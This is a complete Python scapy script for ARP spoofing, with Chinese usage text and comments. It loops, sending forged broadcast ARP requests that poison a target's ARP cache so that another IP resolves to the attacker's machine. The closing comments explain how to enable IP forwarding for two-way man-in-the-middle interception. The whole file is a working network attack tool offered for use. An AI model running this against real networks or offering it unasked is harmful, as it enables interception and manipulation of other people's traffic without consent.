from scapy.all import *
from scapy.layers.l2 import ARP, Ether


def arp_spoof(fool_ip, ip):
    try:
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=fool_ip, psrc=ip)
        sendp(pkt)
        return
    except:
        return


def main():
    if len(sys.argv) != 3:
        print("Usage: ./arpspoof.py 目标IP 被欺骗IP ")
        sys.exit()
    ip1 = str(sys.argv[1]).strip()
    ip2 = str(sys.argv[2]).strip()
    while True:
        try:
            arp_spoof(ip1, ip2)
            time.sleep(0.5)
        except KeyboardInterrupt:
            print("Exit.......")
            break


if __name__ == '__main__':
    main()
    # 区别于arpspoof，arpspoof以arp响应包进行欺骗，脚本以请求包进行欺骗
    # 双向欺骗时请记得开启路由转发功能：echo '1' > /proc/sys/net/ipv4/ip_forward
